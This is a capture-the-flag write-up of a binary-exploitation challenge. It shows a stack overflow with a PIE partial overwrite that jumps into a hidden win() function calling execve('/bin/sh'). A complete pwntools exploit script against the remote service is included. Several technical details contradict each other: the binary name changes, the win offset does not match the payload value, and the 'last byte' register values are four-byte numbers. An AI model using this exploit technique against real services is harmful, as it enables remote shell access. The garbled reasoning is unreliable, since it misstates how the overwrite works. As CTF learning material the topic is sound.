# Ghazal Edge Writeup

## Description

```text
A compact service accepts one record and then leaves through a narrow exit path. The public binary is the contract.
```

```bash
nc 34.62.69.250 41051
```

```text
Flag format: 0xV01D{...}
```

[Download Challenge](https://files.0xv01d-ctf.xyz/ctf-2026/pwn/ghazal.zip)

## Solution Walkthrough

1. **Step 1**：Analyze the Challenge

   First, inspect the binary:

   ```bash
   checksec ./no_eyes
   ```

   Result:

   ```text
   Arch: amd64
   NX: enabled
   PIE: enabled
   Canary: disabled
   ```

   So we cannot directly jump to a fixed address, nor can we inject shellcode, but we can still use a stack overflow to modify the return address.

2. **Step 2**：Run the Program

   Execute:

   ```bash
   ./run.sh
   ```

   You will see:

   ```text
   Welcome
   Input:
   ```

   Input normal data:

   ```text
   hi
   ```

   Output:

   ```text
   Return reached safely
   ```

   This indicates the program has a normal return path.

3. **Step 3**：Find the Vulnerability

   After disassembling the binary, we can see the program contains an input buffer, and the read length exceeds the buffer size, allowing an overflow into the saved RBP / return address.

   Similar to:

   ```c
   char buf[32];
   read(0, buf, 0x100);
   ```

   Note: since the program enables PIE:

   ```text
   The address of win() changes every execution
   ```

   Therefore, we use a partial overwrite and only modify the last 1~2 bytes of the return address.

4. **Step 4**：Use the Hidden Function

   Inside the binary, we can find a function that is never normally called, with contents equivalent to:

   ```c
   puts("You found it!");
   execve("/bin/sh", 0, 0);
   ```

   This is the win function.

   Its offset is:

   ```text
   0x122a
   ```

   If we can jump into this function, we can obtain a shell.

5. **Step 5**：Final Exploit

   ```python
   payload = b"A" * 39
   payload += p16(0x322a)
   ```

   The key idea is:

   ```text
   Exploit the misalignment at offset 39
   and overwrite only the last byte of RIP
   ```

   So the actual effect becomes overwriting only the final byte of RIP:

   ```text
   saved RBP last byte = 0x6767672a
   RIP last byte       = 0x67676732
   ```

## Exploit (python)

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "34.62.69.250"
PORT = 41051

p = remote(HOST, PORT)

p.recvuntil(b"Input: ")

payload = b"A" * 39
payload += p16(0x322a)

p.send(payload)

p.interactive()
```

After obtaining a shell:

```bash
cat flag.txt
```

## Flag

```text
0xV01D{...}
```

## Conclusion

Vulnerability:

```text
stack overflow + PIE partial overwrite
```

Payload:

```python
payload = b"A" * 39 + p16(0x322a)
```

By exploiting the misaligned write at offset 39, the second byte `0x32` from `p16(0x322a)` overwrites the least significant byte of the return address, causing execution to jump from the normal return path into the middle of the win function.

Finally, the program executes:

```text
You found it!
execve("/bin/sh", 0, 0)
```

Get shell and reads the flag.
